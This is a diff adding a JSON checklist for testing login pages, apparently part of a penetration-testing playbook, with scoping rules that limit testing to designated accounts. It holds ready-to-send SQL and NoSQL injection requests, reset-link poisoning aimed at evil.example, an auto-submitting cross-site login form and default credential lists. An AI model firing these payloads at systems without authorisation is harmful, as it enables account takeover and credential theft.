@@ -1,0 +1,297 @@
+{
+  "schema_version": "1.0.0",
+  "id": "login-page",
+  "title": "Login / identity page",
+  "summary": "Credential transport, account enumeration, lockout, Host-poisoned reset links, MFA skip, and session fixation. Use only designated accounts.",
+  "when": { "has_login": ["yes"] },
+  "also_when": { "has_login": ["unknown"] },
+  "default_for": [],
+  "groups": [
+    {
+      "id": "transport",
+      "title": "Credential transport",
+      "summary": "How the secret travels and whether it leaks into URLs, logs, or referrers.",
+      "checks": [
+        {
+          "id": "tls-login",
+          "title": "Credentials only over TLS",
+          "item": "WAPT-AUTH-001",
+          "related": ["WAPT-HTTP-014"],
+          "severity": "critical",
+          "why": "A login POST on HTTP, or an HTTPS form whose action is http://, exposes the password.",
+          "validate": "The password is observable on a plaintext request or in a Referer to another origin.",
+          "variants": [
+            {
+              "name": "Form action and autocomplete",
+              "kind": "note",
+              "payload": "<form action=\"https://www.example.com/login\" method=\"post\" autocomplete=\"off\">\n  <input type=\"password\" name=\"password\" autocomplete=\"current-password\">\n</form>",
+              "expect": "action must be HTTPS or relative. Watch the actual request, not the HTML, in case JS rewrites it."
+            },
+            {
+              "name": "Password in the query string",
+              "kind": "request",
+              "payload": "GET /login?user=tester&password=ChangeMe1! HTTP/1.1\nHost: www.example.com\nConnection: close",
+              "expect": "Must not authenticate. If the app accepts GET login, the secret is in logs, history, and Referer."
+            }
+          ]
+        },
+        {
+          "id": "default-creds",
+          "title": "Default and seeded accounts",
+          "item": "WAPT-AUTH-003",
+          "related": [],
+          "severity": "high",
+          "why": "Vendor defaults and demo users still authenticate on the confirmed product.",
+          "validate": "A documented default account issues a session. Do not spray; use the product's own list.",
+          "variants": [
+            {
+              "name": "Documented vendor pairs",
+              "kind": "note",
+              "payload": "admin / admin\nadmin / password\nadmin / Password1\nadministrator / administrator\nroot / root\ntest / test\nguest / guest",
+              "expect": "Only the pairs the vendor documents for this product. One try each, then stop."
+            },
+            {
+              "name": "Seeded demo users",
+              "kind": "note",
+              "payload": "demo / demo\nuser / user\ncs / cs\nsupport / support",
+              "expect": "Same rule: only names this product ships. A successful login on a leftover demo account is the finding."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "enumeration",
+      "title": "Enumeration and lockout",
+      "summary": "Whether login, register, and reset disclose which accounts exist, and whether lockout is real.",
+      "checks": [
+        {
+          "id": "user-enum",
+          "title": "Account enumeration",
+          "item": "WAPT-AUTH-005",
+          "related": ["WAPT-AUTH-006", "WAPT-AUTH-007"],
+          "severity": "medium",
+          "why": "Different status, body, or timing for a known vs unknown account.",
+          "validate": "Responses distinguish existing from non-existing accounts consistently across repeats.",
+          "variants": [
+            {
+              "name": "Login — known vs unknown",
+              "kind": "request",
+              "payload": "POST /login HTTP/1.1\nHost: www.example.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 41\n\nusername=known.user%40example.com&password=wrong",
+              "expect": "Compare with username=no.such.user@example.com. Diff status, Location, body length, and JSON error code."
+            },
+            {
+              "name": "Password reset",
+              "kind": "request",
+              "payload": "POST /forgot-password HTTP/1.1\nHost: www.example.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 32\n\nemail=known.user%40example.com",
+              "expect": "\"If the account exists…\" for both, or a distinguishable message/timing for the known address."
+            },
+            {
+              "name": "Registration",
+              "kind": "request",
+              "payload": "POST /register HTTP/1.1\nHost: www.example.com\nContent-Type: application/json\n\n{\"email\":\"known.user@example.com\",\"password\":\"ChangeMe1!\"}",
+              "expect": "\"Email already registered\" vs a generic failure. Same comparison on username."
+            }
+          ]
+        },
+        {
+          "id": "lockout",
+          "title": "Lockout and stuffing controls",
+          "item": "WAPT-AUTH-014",
+          "related": ["WAPT-AUTH-015", "WAPT-AUTH-016", "WAPT-RATE-001"],
+          "severity": "medium",
+          "why": "Guessing continues past the documented threshold, or lockout is a DoS against another user.",
+          "validate": "A bounded burst either is stopped, or it is not. Do not brute-force.",
+          "variants": [
+            {
+              "name": "Five failed logins, one account",
+              "kind": "note",
+              "payload": "Repeat the wrong-password POST five to ten times against YOUR test account only.",
+              "expect": "Captcha, backoff, or lockout. If nothing happens, record the count and stop."
+            },
+            {
+              "name": "Lockout as DoS",
+              "kind": "note",
+              "payload": "Do not lock a real user. If the policy is per-account and has no unlock, note the DoS risk without triggering it against anyone else.",
+              "expect": "Per-account lockout without a self-service unlock is a finding only with owner approval to demonstrate."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "reset-session",
+      "title": "Reset links and session",
+      "summary": "Host-poisoned reset URLs, token reuse, and pre-auth session fixation.",
+      "checks": [
+        {
+          "id": "reset-host",
+          "title": "Host-poisoned reset / invite link",
+          "item": "WAPT-INJ-048",
+          "related": ["WAPT-AUTH-026", "WAPT-HTTP-012"],
+          "severity": "critical",
+          "why": "The reset email is built from Host or X-Forwarded-Host, so the token is delivered to an attacker origin.",
+          "validate": "The mail contains a working token URL whose host is one you control. Use a disposable account and inbox.",
+          "variants": [
+            {
+              "name": "Arbitrary Host on forgot-password",
+              "kind": "request",
+              "payload": "POST /forgot-password HTTP/1.1\nHost: evil.example\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 32\n\nemail=tester%40example.com",
+              "expect": "The email must still point at the canonical origin. If it points at evil.example, that is the finding."
+            },
+            {
+              "name": "X-Forwarded-Host on forgot-password",
+              "kind": "request",
+              "payload": "POST /forgot-password HTTP/1.1\nHost: www.example.com\nX-Forwarded-Host: evil.example\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 32\n\nemail=tester%40example.com",
+              "expect": "Same check. Also try X-Forwarded-Proto: http and Forwarded: host=evil.example."
+            },
+            {
+              "name": "Duplicate Host",
+              "kind": "request",
+              "payload": "POST /forgot-password HTTP/1.1\nHost: www.example.com\nHost: evil.example\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 32\n\nemail=tester%40example.com",
+              "expect": "Edge and app must agree. The mail host is the evidence, not the HTTP response."
+            }
+          ]
+        },
+        {
+          "id": "reset-token",
+          "title": "Reset token properties",
+          "item": "WAPT-AUTH-024",
+          "related": ["WAPT-AUTH-025", "WAPT-AUTH-027"],
+          "severity": "high",
+          "why": "Predictable, reusable, or cross-account tokens take over the inbox-holder's account.",
+          "validate": "The same token works twice, for another account, or is guessable from a small sample.",
+          "variants": [
+            {
+              "name": "Reuse after first use",
+              "kind": "note",
+              "payload": "Request a reset, complete it, then replay the same URL.",
+              "expect": "Second use must fail. Also try the token against a second account you control."
+            },
+            {
+              "name": "Token in Referer",
+              "kind": "note",
+              "payload": "Open the reset link, then click any third-party resource on the page and inspect Referer.",
+              "expect": "The token must not leave the origin."
+            }
+          ]
+        },
+        {
+          "id": "fixation",
+          "title": "Session fixation / rotation",
+          "item": "WAPT-SESS-009",
+          "related": ["WAPT-SESS-010"],
+          "severity": "high",
+          "why": "A pre-login cookie that survives authentication lets an attacker plant the session.",
+          "validate": "The session identifier issued before login is still accepted after login.",
+          "variants": [
+            {
+              "name": "Compare pre- and post-login cookies",
+              "kind": "note",
+              "payload": "Note Set-Cookie on GET /login, submit credentials, compare the cookie name and value.",
+              "expect": "Value must change. A new name with the old value still counting is the same bug."
+            },
+            {
+              "name": "Planted cookie",
+              "kind": "request",
+              "payload": "POST /login HTTP/1.1\nHost: www.example.com\nCookie: session=wapt-planted-value\nContent-Type: application/x-www-form-urlencoded\n\nusername=tester&password=ChangeMe1!",
+              "expect": "The planted value must not become the authenticated session."
+            }
+          ]
+        },
+        {
+          "id": "mfa-skip",
+          "title": "MFA completion skip",
+          "item": "WAPT-AUTH-030",
+          "related": ["WAPT-AUTH-029"],
+          "severity": "high",
+          "why": "Step one succeeds, then the post-MFA URL works without the second factor.",
+          "validate": "An authenticated session is issued without a valid OTP, push, or WebAuthn assertion.",
+          "variants": [
+            {
+              "name": "Direct post-MFA request",
+              "kind": "note",
+              "payload": "Complete username/password, capture the next request, drop the OTP field, and send it.",
+              "expect": "Must stay in the MFA step. Also try the destination URL the UI would have loaded after MFA."
+            },
+            {
+              "name": "Reuse a just-used OTP",
+              "kind": "note",
+              "payload": "Submit the current TOTP twice in two sessions.",
+              "expect": "Second use must fail inside the validity window."
+            }
+          ]
+        },
+        {
+          "id": "login-csrf",
+          "title": "Login CSRF",
+          "item": "WAPT-CSRF-013",
+          "related": ["WAPT-CSRF-002"],
+          "severity": "medium",
+          "why": "A cross-site POST logs the victim into the attacker's account so later activity is attacker-visible.",
+          "validate": "A cross-origin form login succeeds in the victim browser and a later action is bound to the attacker account.",
+          "variants": [
+            {
+              "name": "Cross-site login form",
+              "kind": "html",
+              "payload": "<form action=\"https://www.example.com/login\" method=\"POST\">\n  <input name=\"username\" value=\"attacker@example.com\">\n  <input name=\"password\" value=\"ChangeMe1!\">\n</form>\n<script>document.forms[0].submit()</script>",
+              "expect": "Must fail without a valid CSRF token / SameSite=Strict session. Impact needs a follow-on action, not just a 200."
+            },
+            {
+              "name": "JSON login as text/plain",
+              "kind": "request",
+              "payload": "POST /api/login HTTP/1.1\nHost: www.example.com\nContent-Type: text/plain\nOrigin: https://evil.example\n\n{\"username\":\"attacker@example.com\",\"password\":\"ChangeMe1!\"}",
+              "expect": "A JSON-only login that also parses text/plain is CSRF-simple. Must reject or require a custom header."
+            }
+          ]
+        },
+        {
+          "id": "sqli-login",
+          "title": "SQL injection on login",
+          "item": "WAPT-INJ-001",
+          "related": ["WAPT-INJ-002", "WAPT-AUTH-019"],
+          "severity": "critical",
+          "why": "Username or password is concatenated into a SQL string, so a quote changes the authentication result.",
+          "validate": "A boolean or comment payload authenticates without the real password, or produces a consistent SQL error differential. Use your test account only.",
+          "variants": [
+            {
+              "name": "Classic comment bypass",
+              "kind": "request",
+              "payload": "POST /login HTTP/1.1\nHost: www.example.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=tester%27--+&password=x",
+              "expect": "Must not issue a session. Also try tester' OR '1'='1' -- and admin'/*."
+            },
+            {
+              "name": "JSON boolean pair",
+              "kind": "request",
+              "payload": "POST /api/login HTTP/1.1\nHost: www.example.com\nContent-Type: application/json\n\n{\"username\":\"tester' AND '1'='1\",\"password\":\"wrong\"}",
+              "expect": "Compare with AND '1'='2. A stable differential or a successful login is the finding. Do not dump users."
+            }
+          ]
+        },
+        {
+          "id": "nosql-login",
+          "title": "NoSQL operator injection on login",
+          "item": "WAPT-INJ-010",
+          "related": ["WAPT-INJ-009"],
+          "severity": "critical",
+          "why": "JSON login accepts $ne / $gt so password:{$ne:\"\"} authenticates as that user.",
+          "validate": "A JSON operator payload issues a session for your test account without the real password.",
+          "variants": [
+            {
+              "name": "password $ne",
+              "kind": "request",
+              "payload": "POST /api/login HTTP/1.1\nHost: www.example.com\nContent-Type: application/json\n\n{\"username\":\"tester\",\"password\":{\"$ne\":\"\"}}",
+              "expect": "Must 401. A session for tester is the finding. Also try {\"$gt\":\"\"}."
+            },
+            {
+              "name": "Bracket operators",
+              "kind": "request",
+              "payload": "POST /login HTTP/1.1\nHost: www.example.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=tester&password[$ne]=",
+              "expect": "qs parsers turn this into operators. Must not authenticate."
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
